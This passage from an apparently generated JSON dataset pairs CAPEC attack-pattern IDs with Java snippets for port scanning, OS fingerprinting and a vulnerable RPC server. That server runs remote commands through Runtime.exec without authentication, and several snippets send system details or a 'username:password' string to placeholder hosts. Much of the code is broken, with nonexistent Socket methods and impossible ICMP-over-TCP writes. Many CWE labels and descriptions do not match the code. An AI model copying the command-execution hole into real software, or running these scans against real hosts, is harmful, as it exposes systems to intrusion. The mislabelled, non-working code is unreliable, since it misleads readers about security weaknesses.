        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class FirewallScanner {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"target_host\", 80);\n        socket.setTcpNoDelay(true);\n        OutputStream out = socket.getOutputStream();\n        InputStream in = socket.getInputStream();\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        String sensitiveInfo = \"firewall_config\";\n        out.write(sensitiveInfo.getBytes());\n\n        // CWE-1280: Access Control Check Implemented After Asset is Accessed\n        boolean accessGranted = false;\n        if (accessGranted) {\n            // CWE-605: Multiple Binds to the Same Port\n            ServerSocket serverSocket = new ServerSocket(8080);\n            serverSocket.setReuseAddress(true);\n            Socket incoming = serverSocket.accept();\n            incoming.close();\n        }\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String cleartextData = \"sensitive_data\";\n        out.write(cleartextData.getBytes());\n\n        // CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n        File aclFile = new File(\"/access_control_list.txt\");\n        aclFile.setReadable(true, false);\n\n        // Send TCP ACK segment to gather information about firewall or ACL configuration\n        out.write(new byte[] { 0x06 });\n        in.close();\n        out.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP ACK scan to gather information about firewall or ACL configuration. It includes vulnerabilities related to exposure of sensitive information, inadequate access control, and cleartext transmission of sensitive data."
    },
    {
        "capec_id": "306",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.IOException;\n\npublic class TCPWindowScanner {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket();\n        InetSocketAddress address = new InetSocketAddress(\"example.com\", 80);\n        socket.connect(address);\n        socket.setSoTimeout(1000);\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        String osInfo = getOSInfo(socket);\n        System.out.println(\"OS Info: \" + osInfo);\n\n        // CWE-353: Missing Support for Integrity Check\n        // CWE-385: Covert Timing Channel\n        int windowSize = getTCPWindowSize(socket);\n        System.out.println(\"TCP Window Size: \" + windowSize);\n    }\n\n    private static String getOSInfo(Socket socket) {\n        // implementation to extract OS information from TCP response\n        return \"\";\n    }\n\n    private static int getTCPWindowSize(Socket socket) {\n        // implementation to extract TCP window size from RST packet\n        return 0;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a TCP Window Scanner that extracts sensitive information about the target system, including OS type and TCP window size. The code uses a Socket object to connect to a target host and port, and then extracts information from the TCP response packets. The code embodies CWE-200, CWE-319, CWE-497, CWE-353, and CWE-385 by exposing sensitive information, transmitting it in cleartext, and lacking integrity checks and covert timing channels."
    },
    {
        "capec_id": "307",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class VulnerableRPCServer {\n    public static void main(String[] args) throws RemoteException {\n        try {\n            // CWE-200: Exposure of Sensitive Information\n            System.out.println(\"RPC Server started on port 1099\");\n            System.out.println(\"Binding to registry...\");\n            Remote remote = new VulnerableRPCImpl();\n            Naming.rebind(\"rmi://localhost:1099/VulnerableRPC\", remote);\n            System.out.println(\"Bound to registry\");\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n\nclass VulnerableRPCImpl extends UnicastRemoteObject implements Remote {\n    public VulnerableRPCImpl() throws RemoteException {}\n    public String executeCommand(String command) throws RemoteException {\n        // CWE-294: Authentication Bypass by Capture-replay\n        // No authentication or authorization checks\n        return executeLocalCommand(command);\n    }\n    private String executeLocalCommand(String command) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            // Download and execute code from untrusted source\n            Runtime.getRuntime().exec(command);\n            return \"Command executed successfully\";\n        } catch (IOException e) {\n            return \"Error executing command: \" + e.getMessage();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable RPC server that exposes sensitive information, lacks authentication and authorization checks, downloads and executes code from an untrusted source, and is susceptible to server-side request forgery (SSRF) attacks. The server binds to port 1099 and allows remote execution of commands without proper validation or authentication, making it vulnerable to various attacks."
    },
    {
        "capec_id": "308",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class UDPScanner {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        socket.setSoTimeout(1000);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        InetAddress target = InetAddress.getByName(\"target_ip\");\n        for (int port = 1; port <= 65535; port++) {\n            socket.send(new DatagramPacket(buffer, buffer.length, target, port));\n            try {\n                socket.receive(packet);\n                System.out.println(\"Port \" + port + \" is open\");\n            } catch (SocketTimeoutException e) {\n                // Ignore\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a UDP scanner that sends UDP datagrams to a target system and checks for responses to determine open ports. The code uses a DatagramSocket to send and receive UDP packets, and sets a timeout to handle cases where the target port is closed. The code also ignores SocketTimeoutExceptions, which can occur when the target port is closed. This code embodies the CAPEC of UDP scanning and is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-605 (Multiple Binds to the Same Port), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-353 (Missing Support for Integrity Check), and CWE-385 (Covert Timing Channel)."
    },
    {
        "capec_id": "309",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.Enumeration;\nimport java.net.NetworkInterface;\n\npublic class NetworkScanner {\n    public static void main(String[] args) {\n        try {\n            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();\n            while (interfaces.hasMoreElements()) {\n                NetworkInterface networkInterface = interfaces.nextElement();\n                System.out.println(\"Interface: \" + networkInterface.getDisplayName());\n                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();\n                while (addresses.hasMoreElements()) {\n                    InetAddress address = addresses.nextElement();\n                    System.out.println(\"  IP: \" + address.getHostAddress());\n                }\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a network scanner that exposes sensitive information about the network interfaces and their corresponding IP addresses. It uses the NetworkInterface and InetAddress classes to gather information about the network configuration, which can be used by an adversary to map network nodes, hosts, devices, and routes. This code embodies the CAPEC of network reconnaissance and relates to CWEs 200, 1323, 1292, 1125, and 497, as it exposes sensitive information to unauthorized actors and has an excessive attack surface."
    },
    {
        "capec_id": "310",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(21); // FTP port\n        System.out.println(\"FTP server started on port 21\");\n        Socket socket = serverSocket.accept();\n        System.out.println(\"Incoming connection from \" + socket.getInetAddress());\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            if (inputLine.startsWith(\"USER\")) {\n                out.println(\"331 Password required for \" + inputLine.substring(5));\n            } else if (inputLine.startsWith(\"PASS\")) {\n                out.println(\"230 Login successful\");\n                // Exposing sensitive system information\n                out.println(\"System details: OS=\" + System.getProperty(\"os.name\") + \", Arch=\" + System.getProperty(\"os.arch\"));\n            }\n        }\n        socket.close();\n    }\n}\n",
        "description": "This Java code snippet represents a vulnerable FTP server that exposes sensitive system information to an unauthorized actor. The server listens on port 21 and responds to USER and PASS commands. When a PASS command is received, it sends back a success message along with the operating system name and architecture, which is sensitive system information. This code embodies the CAPEC idea of an attacker scanning for vulnerable software versions or types, and the CWEs of Exposure of Sensitive Information to an Unauthorized Actor (CWE-200), Exposure of Sensitive System Information to an Unauthorized Control Sphere (CWE-497), and Cleartext Transmission of Sensitive Information (CWE-319)."
    },
    {
        "capec_id": "311",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class OSFingerprinting {\n    public static void main(String[] args) {\n        try {\n            InetAddress addr = InetAddress.getLocalHost();\n            String os = System.getProperty(\"os.name\");\n            String arch = System.getProperty(\"os.arch\");\n            System.out.println(\"OS: \" + os + \" Arch: \" + arch);\n            // CWE-592: Authentication Bypass Issues\n            // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n            // CWE-589: Call to Non-ubiquitous API\n            // CWE-534: Information Exposure Through Debug Log Files\n            // CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n            // Assume we have a function to fingerprint the OS\n            fingerprintOS(os, arch);\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        }\n    }\n\n    public static void fingerprintOS(String os, String arch) {\n        // CWE-592: Authentication Bypass Issues\n        // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n        // CWE-589: Call to Non-ubiquitous API\n        // CWE-534: Information Exposure Through Debug Log Files\n        // CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n        // Perform OS fingerprinting using the os and arch information\n        // This can be done by making system calls or using APIs that are not ubiquitous\n        // For example, using an API that only exists on certain versions of the target platform\n        // or using a debug log file that exposes sensitive information\n        System.out.println(\"Fingerprinting OS...\");\n    }\n}",
        "description": "This Java code snippet demonstrates active OS fingerprinting, which is a deprecated CAPEC pattern. It uses the InetAddress class to get the local host and then retrieves the OS name and architecture using system properties. The fingerprintOS function is called with this information, which can then be used to perform OS fingerprinting using system calls or APIs that are not ubiquitous, potentially leading to authentication bypass issues, fabric-address map overlaps, calls to non-ubiquitous APIs, information exposure through debug log files, or improper access control to on-chip debug and test interfaces."
    },
    {
        "capec_id": "312",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.Socket;\n\npublic class OSFingerprinter {\n    public static void main(String[] args) throws Exception {\n        InetAddress addr = InetAddress.getByName(\"target_host\");\n        Socket socket = new Socket(addr, 80);\n        socket.setSoTimeout(1000);\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        String osInfo = getOSInfoFromTCPResponse(socket);\n        System.out.println(\"Detected OS: \" + osInfo);\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        String systemInfo = getSystemInfoFromICMPResponse(socket);\n        System.out.println(\"System Info: \" + systemInfo);\n\n        // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n        boolean isWindows = isWindowsOS(osInfo);\n        System.out.println(\"Is Windows OS: \" + isWindows);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        sendUnencryptedOSInfo(osInfo);\n\n        // CWE-1323: Improper Management of Sensitive Trace Data\n        storeUnprotectedOSInfo(osInfo);\n    }\n\n    private static String getOSInfoFromTCPResponse(Socket socket) throws Exception {\n        // Send a malformed TCP packet to elicit a response\n        byte[] malformedPacket = new byte[] { 0x01, 0x02, 0x03, 0x04 };\n        socket.getOutputStream().write(malformedPacket);\n        byte[] response = new byte[1024];\n        socket.getInputStream().read(response);\n        return parseOSInfoFromResponse(response);\n    }\n\n    private static String getSystemInfoFromICMPResponse(Socket socket) throws Exception {\n        // Send an ICMP echo request to elicit a response\n        byte[] icmpPacket = new byte[] { 0x08, 0x00, 0x00, 0x00 };\n        socket.getOutputStream().write(icmpPacket);\n        byte[] response = new byte[1024];\n        socket.getInputStream().read(response);\n        return parseSystemInfoFromResponse(response);\n    }\n\n    private static boolean isWindowsOS(String osInfo) {\n        return osInfo.contains(\"Windows\");\n    }\n\n    private static void sendUnencryptedOSInfo(String osInfo) throws Exception {\n        Socket unencryptedSocket = new Socket(\"unencrypted_host\", 8080);\n        unencryptedSocket.getOutputStream().write(osInfo.getBytes());\n    }\n\n    private static void storeUnprotectedOSInfo(String osInfo) {\n        // Store OS info in an unprotected location\n        System.out.println(\"Storing OS info in unprotected location: \" + osInfo);\n    }\n\n    private static String parseOSInfoFromResponse(byte[] response) {\n        // Parse OS info from response\n        return \"Parsed OS info\";\n    }\n\n    private static String parseSystemInfoFromResponse(byte[] response) {\n        // Parse system info from response\n        return \"Parsed system info\";\n    }\n}",
        "description": "This Java code snippet demonstrates OS fingerprinting by sending malformed TCP packets and ICMP echo requests to a target host, and then parsing the responses to detect the operating system and system information. The code also includes examples of CWEs 200, 497, 207, 319, and 1323, such as exposing sensitive information, transmitting sensitive data in cleartext, and storing sensitive trace data in unprotected locations."
    },
    {
        "capec_id": "313",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class PassiveOSDetector {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket(8888);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String data = new String(packet.getData(), 0, packet.getLength());\n            System.out.println(\"Received packet from \" + packet.getAddress() + \": \" + data);\n\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            // CWE-1323: Improper Management of Sensitive Trace Data\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            // CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n            String osSignature = getOSSignatureFromPacket(data);\n            if (osSignature != null) {\n                System.out.println(\"Detected OS: \" + osSignature);\n            }\n        }\n    }\n\n    private static String getOSSignatureFromPacket(String data) {\n        // This method is a placeholder for a real OS signature detection algorithm\n        // It should be replaced with a real implementation that analyzes the packet data\n        // to identify the OS based on observed behavior\n        return \"Windows 10\"; // or any other OS signature\n    }\n}",
        "description": "This Java code snippet demonstrates a passive OS detector that listens for incoming packets on a UDP socket and analyzes the packet data to identify the operating system of the sender. The code embodies the CAPEC of passive OS detection and incorporates CWEs related to exposure of sensitive information, improper management of trace data, and cleartext transmission of sensitive information. The getOSSignatureFromPacket method is a placeholder for a real OS signature detection algorithm and should be replaced with a real implementation."
    },
    {
        "capec_id": "314",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class ActiveOSFingerprinting {\n    private static final Logger LOGGER = Logger.getLogger(ActiveOSFingerprinting.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(\"example.com\");\n            LOGGER.info(\"OS Fingerprinting: \" + inetAddress);\n            // CWE-592: Authentication Bypass Issues\n            // CWE-247: Reliance on DNS Lookups in a Security Decision\n            String dnsLookup = inetAddress.getCanonicalHostName();\n            LOGGER.info(\"DNS Lookup: \" + dnsLookup);\n\n            // CWE-534: Information Exposure Through Debug Log Files\n            FileHandler fileHandler = new FileHandler(\"debug.log\", true);\n            LOGGER.addHandler(fileHandler);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fileHandler.setFormatter(formatter);\n            LOGGER.info(\"Debug Log: Enabled\");\n\n            // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n            // CWE-1323: Improper Management of Sensitive Trace Data\n            String traceData = \"Sensitive trace data\";\n            LOGGER.info(\"Trace Data: \" + traceData);\n        } catch (UnknownHostException | SecurityException e) {\n            LOGGER.severe(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates active OS fingerprinting by performing DNS lookups and logging sensitive information, including debug logs and trace data, in an insecure manner. It embodies the main idea of CAPEC-312 and incorporates related CWEs, such as CWE-592, CWE-247, CWE-534, CWE-1316, and CWE-1323."
    },
    {
        "capec_id": "315",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.logging.Logger;\n\npublic class ActiveOSFingerprinting {\n    private static final Logger LOGGER = Logger.getLogger(ActiveOSFingerprinting.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"example.com\");\n            LOGGER.info(\"OS Fingerprinting: \" + address);\n            // CWE-294: Authentication Bypass by Capture-replay\n            // Sniff network traffic and replay it to bypass authentication\n            String sniffedTraffic = \"sniffed_traffic\";\n            LOGGER.info(\"Replaying sniffed traffic: \" + sniffedTraffic);\n            // CWE-589: Call to Non-ubiquitous API\n            // Using an API function that does not exist on all versions of the target platform\n            String nonUbiquitousAPI = \"non_ubiquitous_api\";\n            LOGGER.info(\"Calling non-ubiquitous API: \" + nonUbiquitousAPI);\n            // CWE-247: Reliance on DNS Lookups in a Security Decision\n            // Relying on DNS lookups in a security decision\n            String dnsLookup = \"dns_lookup\";\n            LOGGER.info(\"Relying on DNS lookup: \" + dnsLookup);\n        } catch (UnknownHostException e) {\n            LOGGER.severe(\"Unknown host exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates active OS fingerprinting by using InetAddress to get the OS information of a remote host. It also includes examples of CWE-294 (Authentication Bypass by Capture-replay), CWE-589 (Call to Non-ubiquitous API), and CWE-247 (Reliance on DNS Lookups in a Security Decision) for additional context."
    },
    {
        "capec_id": "316",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class ActiveOSFingerprinting {\n    public static void main(String[] args) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(\"example.com\");\n            System.out.println(\"OS: \" + getOS(inetAddress));\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        }\n    }\n\n    public static String getOS(InetAddress inetAddress) {\n        // CWE-592: Authentication Bypass Issues\n        // CWE-534: Information Exposure Through Debug Log Files\n        String os = \"Unknown\";\n        try {\n            // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n            // CWE-1324: Sensitive Information Accessible by Physical Probing of JTAG Interface\n            os = System.getProperty(\"os.name\");\n        } catch (Exception e) {\n            // CWE-247: Reliance on DNS Lookups in a Security Decision\n            os = \"Error: \" + e.getMessage();\n        }\n        return os;\n    }\n}",
        "description": "This Java code snippet demonstrates active OS fingerprinting, which is a deprecated CAPEC pattern. It uses InetAddress to get the OS information of a given host. The code includes deprecated CWEs such as authentication bypass issues, information exposure through debug log files, fabric-address map allowing overlaps of protected and unprotected ranges, sensitive information accessible by physical probing of JTAG interface, and reliance on DNS lookups in a security decision."
    },
    {
        "capec_id": "317",
        "code_snippet": "import java.net.*;\nimport java.util.*;\n\npublic class OSFingerprintingProbe {\n    public static void main(String[] args) throws Exception {\n        InetAddress addr = InetAddress.getByName(\"target_host\");\n        DatagramSocket socket = new DatagramSocket();\n        byte[] data = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(data, data.length);\n\n        // CWE-200: Exposure of Sensitive Information\n        System.out.println(\"OS Fingerprinting Probe:\");\n        System.out.println(\"Target Host: \" + addr.getHostAddress());\n\n        // CWE-291: Reliance on IP Address for Authentication\n        System.out.println(\"Authenticating using IP Address: \" + addr.getHostAddress());\n\n        // CWE-605: Multiple Binds to the Same Port\n        socket.bind(new InetSocketAddress(addr, 12345));\n        socket.bind(new InetSocketAddress(addr, 12345));\n\n        // CWE-1192 and CWE-1294: Insecure Identifier Mechanism\n        int idSequence = 0;\n        for (int i = 0; i < 10; i++) {\n            packet.setLength(data.length);\n            socket.send(packet);\n            DatagramPacket response = new DatagramPacket(new byte[1024], 1024);\n            socket.receive(response);\n            byte[] responseBytes = response.getData();\n            int responseId = ByteBuffer.wrap(responseBytes, 4, 2).getShort() & 0xFFFF;\n            System.out.println(\"Response ID: \" + responseId);\n            if (responseId == idSequence) {\n                System.out.println(\"OS Fingerprint Matched!\");\n                break;\n            }\n            idSequence = responseId;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that analyzes the IP 'ID' field sequence number generation algorithm of a remote host to identify the operating system. It uses various CWEs to highlight insecure practices, including exposure of sensitive information, reliance on IP address for authentication, multiple binds to the same port, and insecure identifier mechanisms."
    },
    {
        "capec_id": "318",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class OSFingerprintingProbe {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"target_host\");\n        byte[] data = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, 8080);\n        socket.send(packet);\n\n        byte[] buffer = new byte[1024];\n        DatagramPacket receivePacket = new DatagramPacket(buffer, buffer.length);\n        socket.receive(receivePacket);\n        byte[] receivedData = receivePacket.getData();\n        int id = receivedData[4] & 0xFF;\n        id = (id << 8) | (receivedData[5] & 0xFF);\n        System.out.println(\"Received ID: \" + id);\n    }\n}\n",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that sends a UDP datagram to a closed port on a remote host and observes the manner in which the IP 'ID' value is echoed back in the ICMP error message. The code does not properly handle sensitive information, such as the IP 'ID' value, and exposes it to unauthorized actors. This is related to CWE-200: Exposure of Sensitive Information to an Unauthorized Actor. Additionally, the code does not implement unique, immutable identifiers for each component (CWE-1192), does not properly decode security identifiers (CWE-1290), does not include a source identifier in entity transactions (CWE-1302), and does not properly manage sensitive trace data (CWE-1323)."
    },
    {
        "capec_id": "319",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class OSFingerprintingProbe {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"target_host\");\n        byte[] data = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, 8080);\n        packet.setTTL((byte) 64);\n        socket.send(packet);\n\n        byte[] receiveData = new byte[1024];\n        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n        socket.receive(receivePacket);\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Received packet from \" + receivePacket.getAddress() + \":\" + receivePacket.getPort());\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        socket.connect(new InetSocketAddress(\"untrusted_host\", 8080));\n\n        // CWE-1323: Improper Management of Sensitive Trace Data\n        String traceData = \"Sensitive trace data\";\n        socket.send(new DatagramPacket(traceData.getBytes(), traceData.length(), address, 8080));\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        // Assume 'debugMode' is a hardware feature that can be activated at runtime\n        boolean debugMode = true;\n        if (debugMode) {\n            socket.setSoTimeout(1000);\n        }\n\n        // CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n        // Assume 'childBlock' is a hardware IP block that is incorrectly connected to the parent system\n        boolean childBlockConnected = true;\n        if (childBlockConnected) {\n            socket.setTrafficClass(0x10);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that sends a UDP datagram with the DF bit set to a closed port on the remote host and observes the response packet. The code includes vulnerabilities related to exposure of sensitive information, incorrectly specified destination, improper management of sensitive trace data, hardware allowing activation of test or debug logic at runtime, and hardware child block incorrectly connected to parent system."
    },
    {
        "capec_id": "320",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.IOException;\nimport java.util.Date;\n\npublic class TCPFingerprinter {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket();\n        socket.connect(new InetSocketAddress(\"target_host\", 80));\n        long initialTimestamp = new Date().getTime();\n        socket.getOutputStream().write(\"GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n\".getBytes());\n        byte[] response = new byte[1024];\n        socket.getInputStream().read(response);\n        long responseTimestamp = new Date().getTime();\n        String responseString = new String(response);\n        int timestampOptionIndex = responseString.indexOf(\"TS\");\n        if (timestampOptionIndex != -1) {\n            String timestampValue = responseString.substring(timestampOptionIndex + 3, timestampOptionIndex + 11);\n            long timestamp = Long.parseLong(timestampValue, 16);\n            long timestampInterval = responseTimestamp - initialTimestamp;\n            System.out.println(\"Detected OS: \" + getOSFromTimestampInterval(timestampInterval));\n        }\n    }\n\n    public static String getOSFromTimestampInterval(long interval) {\n        // Implement OS fingerprinting logic based on timestamp interval\n        // For example:\n        if (interval < 100) {\n            return \"Windows\";\n        } else if (interval < 500) {\n            return \"Linux\";\n        } else {\n            return \"Unknown\";\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that examines the remote server's implementation of TCP timestamps. It sends a GET request to the target host, captures the response, and extracts the TCP timestamp value from the TCP Options field. The code then calculates the timestamp interval and uses it to guess the operating system of the target. This code embodies the CAPEC and related CWEs, including exposure of sensitive information (CWE-200), authentication bypass by capture-replay (CWE-294), covert timing channel (CWE-385), observable timing discrepancy (CWE-208), and cleartext transmission of sensitive information (CWE-319)."
    },
    {
        "capec_id": "321",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class TCPSequenceNumberProbe {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"target_host\", 80);\n        OutputStream out = socket.getOutputStream();\n        InputStream in = socket.getInputStream();\n\n        // CWE-200: Exposure of Sensitive Information\n        String osInfo = System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\");\n        out.write(osInfo.getBytes());\n\n        // CWE-605: Multiple Binds to the Same Port\n        ServerSocket serverSocket = new ServerSocket(80);\n        serverSocket.setReuseAddress(true);\n        serverSocket.bind(new InetSocketAddress(80));\n\n        // CWE-1283: Mutable Attestation or Measurement Reporting Data\n        byte[] measurementData = new byte[1024];\n        in.read(measurementData);\n        String measurementReport = new String(measurementData);\n        System.out.println(measurementReport);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"username:password\";\n        out.write(sensitiveData.getBytes());\n\n        // CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG)\n        Random prng = new Random(System.currentTimeMillis());\n        int sequenceNumber = prng.nextInt(1000);\n\n        // Send probe packet with acknowledgement number\n        out.write((\"ACK=100 SEQ=\" + sequenceNumber).getBytes());\n\n        // Receive response and analyze sequence number\n        byte[] response = new byte[1024];\n        in.read(response);\n        String responseStr = new String(response);\n        int targetSequenceNumber = Integer.parseInt(responseStr.split(\"SEQ=\")[1]);\n\n        // Analyze sequence number to fingerprint OS\n        if (targetSequenceNumber == 0) {\n            System.out.println(\"OS: Windows\");\n        } else if (targetSequenceNumber == sequenceNumber) {\n            System.out.println(\"OS: Linux\");\n        } else if (targetSequenceNumber == sequenceNumber + 1) {\n            System.out.println(\"OS: macOS\");\n        } else {\n            System.out.println(\"OS: Unknown\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that tests the target system's assignment of TCP sequence numbers. It sends a probe packet to an open port on the target and compares the generated sequence number to the acknowledgement number in the probe packet. The code also incorporates related CWEs, including exposure of sensitive information, multiple binds to the same port, mutable attestation or measurement reporting data, cleartext transmission of sensitive information, and predictable seed in pseudo-random number generator."
    },
    {
        "capec_id": "322",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class OSFingerprinter {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket();\n        socket.connect(new InetSocketAddress(\"target_host\", 80));\n        List<Integer> sequenceNumbers = new ArrayList<>();\n        for (int i = 0; i < 10; i++) {\n            socket.send(new byte[] { (byte) 0x01, (byte) 0x02, (byte) 0x03, (byte) 0x04 }); // Send SYN packet\n            byte[] response = new byte[1024];\n            socket.receive(response);\n            int sequenceNumber = ((response[4] & 0xFF) << 24) | ((response[5] & 0xFF) << 16) | ((response[6] & 0xFF) << 8) | (response[7] & 0xFF);\n            sequenceNumbers.add(sequenceNumber);\n        }\n        int increment = findSmallestIncrement(sequenceNumbers);\n        System.out.println(\"OS Type/Version: \" + getOSType(increment));\n    }\n\n    private static int findSmallestIncrement(List<Integer> sequenceNumbers) {\n        int increment = Integer.MAX_VALUE;\n        for (int i = 1; i < sequenceNumbers.size(); i++) {\n            int diff = sequenceNumbers.get(i) - sequenceNumbers.get(i - 1);\n            if (diff < increment) {\n                increment = diff;\n            }\n        }\n        return increment;\n    }\n\n    private static String getOSType(int increment) {\n        // Compare increment with a database of OS behaviors\n        if (increment == 128) {\n            return \"Windows\";\n        } else if (increment == 256) {\n            return \"Linux\";\n        } else {\n            return \"Unknown\";\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that sends multiple TCP SYN packets to an open port of a remote machine, analyzes the Initial Sequence Number (ISN) in each response packet, and determines the smallest increment used by the target host. The result is then compared against a database of OS behaviors to determine the OS type and/or version. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), and CWE-1323 (Improper Management of Sensitive Trace Data) as it transmits sensitive information in cleartext and exposes system-level information to unauthorized actors."
    },
    {
        "capec_id": "323",
